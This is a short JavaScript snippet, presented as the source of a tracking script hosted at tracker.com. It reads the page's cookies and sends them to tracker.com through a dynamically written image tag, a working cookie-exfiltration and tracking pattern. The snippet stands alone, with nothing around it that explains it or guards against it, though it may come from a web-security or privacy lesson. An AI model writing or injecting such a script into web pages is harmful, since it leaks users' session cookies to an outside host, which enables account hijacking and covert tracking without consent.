// source code of http://tracker.com/t.js

x = document.cookie;
var url = 'http://tracker.com/track?tid=' + encodeURI(document.cookie);    
console.log(url);
document.write('<img src=' + url + '/>');
